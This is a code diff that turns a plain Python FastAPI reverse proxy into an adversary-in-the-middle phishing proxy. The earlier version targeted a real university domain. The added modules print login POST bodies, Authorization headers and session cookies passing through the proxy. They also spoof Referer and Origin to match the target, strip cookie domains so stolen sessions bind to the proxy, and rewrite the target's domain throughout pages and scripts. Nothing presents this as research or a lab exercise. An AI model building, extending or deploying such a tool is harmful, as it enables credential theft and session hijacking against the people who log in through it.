@@ -1,59 +1,154 @@
 import re
-from fastapi import FastAPI, Request, Response, HTTPException
+import asyncio
+import httpx
+import websockets
+from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
 from fastapi.responses import StreamingResponse
 from starlette.background import BackgroundTask
-import httpx
 from urllib.parse import urljoin, urlparse
 
 app = FastAPI()
 
-# follow_redirects=False ensures we intercept redirects to rewrite them
-client = httpx.AsyncClient(follow_redirects=False)
-TARGET_BASE = "https://neust.edu.ph/"
+client = httpx.AsyncClient(follow_redirects=False, timeout=60.0)
+TARGET_BASE = "https://example.com"
 parsed_target = urlparse(TARGET_BASE)
+TARGET_DOMAIN = parsed_target.netloc
 
 HOP_BY_HOP_HEADERS = {
     "connection", "keep-alive", "proxy-authenticate", 
     "proxy-authorization", "te", "trailers", 
     "transfer-encoding", "upgrade", "host", "content-length",
-    "content-encoding"
+    "content-encoding", 
+    "accept-encoding"
 }
 
-# Regex to find and strip the Domain= attribute from cookies
 COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")
+# Keywords to trigger POST body inspection
+AUTH_KEYWORDS = ["login", "auth", "signin", "token", "password"]
 
+# =========================================================
+# [WEBSOCKET PROXY MODULE]
+# =========================================================
+@app.websocket("/{path:path}")
+async def websocket_proxy(websocket: WebSocket, path: str):
+    await websocket.accept()
+    
+    # Safely convert http:// to ws:// and https:// to wss://
+    ws_base = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
+    target_ws_url = urljoin(ws_base.rstrip("/") + "/", path)
+    
+    query_string = websocket.url.query
+    if query_string:
+        target_ws_url += f"?{query_string}"
+
+    print(f"\n[WS] Intercepted WebSocket Upgrade -> Forwarding to: {target_ws_url}")
+
+    try:
+        # Connect to the upstream WebSocket server
+        async with websockets.connect(target_ws_url) as target_ws:
+            
+            # Task to forward messages from Client to Upstream Server
+            async def forward_to_target():
+                try:
+                    while True:
+                        data = await websocket.receive_text()
+                        await target_ws.send(data)
+                except WebSocketDisconnect:
+                    pass
+
+            # Task to forward messages from Upstream Server back to Client
+            async def forward_to_client():
+                try:
+                    while True:
+                        data = await target_ws.recv()
+                        await websocket.send_text(data)
+                except websockets.exceptions.ConnectionClosed:
+                    pass
+
+            # Run both forwarding tasks concurrently
+            await asyncio.gather(forward_to_target(), forward_to_client())
+            
+    except Exception as e:
+        print(f"[WS] Connection Error: {e}")
+    finally:
+        try:
+            await websocket.close()
+        except:
+            pass
+# =========================================================
+
+# =========================================================
+# [HTTP PROXY MODULE]
+# =========================================================
 @app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
 async def proxy(request: Request, path: str):
-    url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
+    # 1. Build the target URL with Query Params preserved
+    query_string = request.url.query
+    target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
+    if query_string:
+        target_url += f"?{query_string}"
     
-    # We need these strings to rewrite absolute URLs in HTML and headers
     proxy_base = str(request.base_url).rstrip("/")
-    target_base_str = TARGET_BASE.rstrip("/")
+    proxy_domain = urlparse(proxy_base).netloc
     
-    # 1. Forward Incoming Headers safely
-    req_headers = [
-        (k, v) for k, v in request.headers.items()
-        if k.lower() not in HOP_BY_HOP_HEADERS
-    ]
+    # ---------------------------------------------------------
+    # [INSPECTION MODULE: Incoming Authorization]
+    # ---------------------------------------------------------
+    auth_header = request.headers.get("authorization")
+    if auth_header:
+        print(f"\n[KEY] Authorization Header Found | Method: {request.method} | Path: /{path}")
+        print(f"      Value: {auth_header}")
+    # ---------------------------------------------------------
+    
+    # 2. Forward Headers & Spoof Identity
+    req_headers = []
+    for k, v in request.headers.items():
+        k_lower = k.lower()
+        if k_lower in HOP_BY_HOP_HEADERS:
+            continue
+        
+        # SPOOF: Tell the target the request came from their own domain
+        if k_lower == "referer":
+            v = v.replace(proxy_domain, TARGET_DOMAIN)
+        if k_lower == "origin":
+            v = v.replace(proxy_domain, TARGET_DOMAIN)
+            
+        req_headers.append((k, v))
+    
+    # Force the host header to the target
+    req_headers.append(("host", TARGET_DOMAIN))
     req_headers.append(("accept-encoding", "identity"))
-    req_headers.append(("host", parsed_target.netloc))
             
     body = await request.body()
     
-    # 2. Dispatch the Request
+    # ---------------------------------------------------------
+    # [INSPECTION MODULE: Authentication POST Bodies]
+    # ---------------------------------------------------------
+    if request.method == "POST":
+        path_lower = path.lower()
+        if any(keyword in path_lower for keyword in AUTH_KEYWORDS):
+            print(f"\n[!] Auth POST Intercepted | Path: /{path}")
+            try:
+                # Decode the raw bytes into a readable string (e.g., form data or JSON)
+                decoded_body = body.decode('utf-8', errors='replace')
+                print(f"    Payload: {decoded_body}")
+            except Exception as e:
+                print(f"    Payload (Raw): {repr(body)}")
+    # ---------------------------------------------------------
+    
+    # 3. Request
     try:
         proxy_req = client.build_request(
             method=request.method,
-            url=url,
+            url=target_url,
             headers=req_headers,
-            content=body,
-            params=dict(request.query_params)
+            content=body
         )
         resp = await client.send(proxy_req, stream=True)
     except httpx.RequestError as exc:
-        raise HTTPException(status_code=502, detail=f"Bad Gateway: {str(exc)}")
+        raise HTTPException(status_code=502, detail=f"Proxy Link Error: {str(exc)}")
 
-    # 3. Process Outgoing Headers (Cookies & Redirects)
+    # 4. Outgoing Headers
     processed_headers = []
     for k, v in resp.headers.multi_items():
         k_lower = k.lower()
@@ -61,44 +156,47 @@ async def proxy(request: Request, path: str):
             continue
             
         if k_lower == "location":
-            # Rewrite upstream redirects to keep the user on the proxy
-            if v.startswith(target_base_str):
-                v = v.replace(target_base_str, proxy_base)
+            v = v.replace(TARGET_DOMAIN, proxy_domain)
+            v = v.replace("https://", "http://") # For local testing
             processed_headers.append((k, v))
             
         elif k_lower == "set-cookie":
-            # Strip the domain attribute. If the domain attribute is missing, 
-            # the browser automatically applies the cookie to the proxy's domain.
+            # ---------------------------------------------------------
+            # [INSPECTION MODULE: Outgoing Session Cookies]
+            # ---------------------------------------------------------
+            print(f"\n[*] Set-Cookie Intercepted | Path: /{path}")
+            print(f"    Cookie: {v}")
+            # ---------------------------------------------------------
             v = COOKIE_DOMAIN_RE.sub("", v)
             processed_headers.append((k, v))
-            
         else:
             processed_headers.append((k, v))
 
-    # 4. Body Processing Fork: HTML vs Streaming
+    # 5. Body Fork
     content_type = resp.headers.get("content-type", "").lower()
     
-    if "text/html" in content_type:
-        # Buffer HTML into memory to manipulate it
-        await resp.aread()
-        html_body = resp.text 
+    if any(t in content_type for t in ["text/html", "javascript", "json"]):
+        raw_bytes = await resp.aread()
+        text = raw_bytes.decode("utf-8", errors="ignore") 
         
-        # A global string replacement is superior to regexing specific tags (like <a href>) 
-        # because it successfully catches absolute URLs hidden inside JavaScript variables and JSON config blocks.
-        rewritten_body = html_body.replace(target_base_str, proxy_base)
-        
-        # Re-encode to bytes
-        body_bytes = rewritten_body.encode("utf-8")
-        final_response = Response(content=body_bytes, status_code=resp.status_code)
+        # Swap raw domain strings to catch subdomains and JS links
+        rewritten = text.replace(TARGET_DOMAIN, proxy_domain)
+        rewritten = rewritten.replace("https://" + proxy_domain, "http://" + proxy_domain)
+
+        final_response = Response(content=rewritten.encode("utf-8"), status_code=resp.status_code)
+        await resp.aclose()
     else:
-        # Stream non-HTML responses untouched
         final_response = StreamingResponse(
             resp.aiter_bytes(),
             status_code=resp.status_code,
             background=BackgroundTask(resp.aclose)
         )
 
-    # 5. Attach processed headers safely to preserve multi-values
+    # 6. Cleanup & Header Attachment
+    # Safely check if the header exists before deleting it using 'del'
+    if "content-length" in final_response.headers:
+        del final_response.headers["content-length"]
+    
     for k, v in processed_headers:
         final_response.headers.append(k, v)
             
